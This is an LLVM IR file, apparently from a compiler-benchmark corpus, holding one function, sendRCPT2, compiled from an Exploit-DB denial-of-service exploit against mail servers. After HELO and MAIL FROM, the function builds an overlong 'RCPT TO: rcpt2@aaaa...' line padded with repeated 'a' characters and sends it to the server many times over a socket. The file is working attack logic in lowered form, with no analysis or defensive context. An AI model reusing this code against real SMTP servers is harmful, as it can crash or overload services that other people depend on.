; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_19571.c_sendRCPT2.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_19571.c_sendRCPT2.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@RCPT2_LENGTH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@STR_HELO = common dso_local global i8* null, align 8
@STR_MAILFROM = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [16 x i8] c"RCPT TO: rcpt2@\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"aaaaaaaaaa\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@RCPT2_NUMBER = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [34 x i8] c"No.%d RCPT TO:rcpt2@aaa.. len %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"%s \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sendRCPT2(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca [80 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %9 = load i32, i32* @RCPT2_LENGTH, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %3, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %4, align 8
  %13 = load i32, i32* @RCPT2_LENGTH, align 4
  %14 = add nsw i32 %13, 80
  %15 = zext i32 %14 to i64
  %16 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %5, align 8
  %17 = trunc i64 %15 to i32
  %18 = call i32 @memset(i8* %16, i32 0, i32 %17)
  %19 = load i32, i32* %2, align 4
  %20 = trunc i64 %15 to i32
  %21 = call i32 @recv(i32 %19, i8* %16, i32 %20, i32 0)
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %16)
  %23 = load i8*, i8** @STR_HELO, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %23)
  %25 = load i32, i32* %2, align 4
  %26 = load i8*, i8** @STR_HELO, align 8
  %27 = load i8*, i8** @STR_HELO, align 8
  %28 = call i32 @strlen(i8* %27)
  %29 = call i32 @send(i32 %25, i8* %26, i32 %28, i32 0)
  %30 = trunc i64 %15 to i32
  %31 = call i32 @memset(i8* %16, i32 0, i32 %30)
  %32 = load i32, i32* %2, align 4
  %33 = trunc i64 %15 to i32
  %34 = call i32 @recv(i32 %32, i8* %16, i32 %33, i32 0)
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %7, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %39

37:                                               ; preds = %1
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %16)
  br label %39

39:                                               ; preds = %37, %1
  %40 = load i8*, i8** @STR_MAILFROM, align 8
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %40)
  %42 = load i32, i32* %2, align 4
  %43 = load i8*, i8** @STR_MAILFROM, align 8
  %44 = load i8*, i8** @STR_MAILFROM, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = call i32 @send(i32 %42, i8* %43, i32 %45, i32 0)
  %47 = trunc i64 %15 to i32
  %48 = call i32 @memset(i8* %16, i32 0, i32 %47)
  %49 = load i32, i32* %2, align 4
  %50 = trunc i64 %15 to i32
  %51 = call i32 @recv(i32 %49, i8* %16, i32 %50, i32 0)
  store i32 %51, i32* %7, align 4
  %52 = load i32, i32* %7, align 4
  %53 = icmp sgt i32 %52, 0
  br i1 %53, label %54, label %56

54:                                               ; preds = %39
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %16)
  br label %56

56:                                               ; preds = %54, %39
  %57 = call i32 @strcpy(i8* %12, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  br label %58

58:                                               ; preds = %63, %56
  %59 = load i32, i32* @RCPT2_LENGTH, align 4
  %60 = call i32 @strlen(i8* %12)
  %61 = sub nsw i32 %59, %60
  %62 = icmp sgt i32 %61, 10
  br i1 %62, label %63, label %65

63:                                               ; preds = %58
  %64 = call i32 @strcat(i8* %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  br label %58

65:                                               ; preds = %58
  %66 = call i32 @strcat(i8* %12, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %67

67:                                               ; preds = %90, %65
  %68 = load i32, i32* %8, align 4
  %69 = load i32, i32* @RCPT2_NUMBER, align 4
  %70 = icmp slt i32 %68, %69
  br i1 %70, label %71, label %93

71:                                               ; preds = %67
  %72 = load i32, i32* %8, align 4
  %73 = call i32 @strlen(i8* %12)
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i32 %72, i32 %73)
  %75 = load i32, i32* %2, align 4
  %76 = call i32 @strlen(i8* %12)
  %77 = call i32 @send(i32 %75, i8* %12, i32 %76, i32 0)
  %78 = load i32, i32* %2, align 4
  %79 = sub i64 %15, 1
  %80 = trunc i64 %79 to i32
  %81 = call i32 @recv(i32 %78, i8* %16, i32 %80, i32 0)
  store i32 %81, i32* %7, align 4
  %82 = getelementptr inbounds [80 x i8], [80 x i8]* %6, i64 0, i64 0
  %83 = call i32 @strncpy(i8* %82, i8* %16, i32 60)
  %84 = load i32, i32* %7, align 4
  %85 = icmp sgt i32 %84, 0
  br i1 %85, label %86, label %89

86:                                               ; preds = %71
  %87 = getelementptr inbounds [80 x i8], [80 x i8]* %6, i64 0, i64 0
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8* %87)
  br label %89

89:                                               ; preds = %86, %71
  br label %90

90:                                               ; preds = %89
  %91 = load i32, i32* %8, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %8, align 4
  br label %67

93:                                               ; preds = %67
  %94 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %94)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
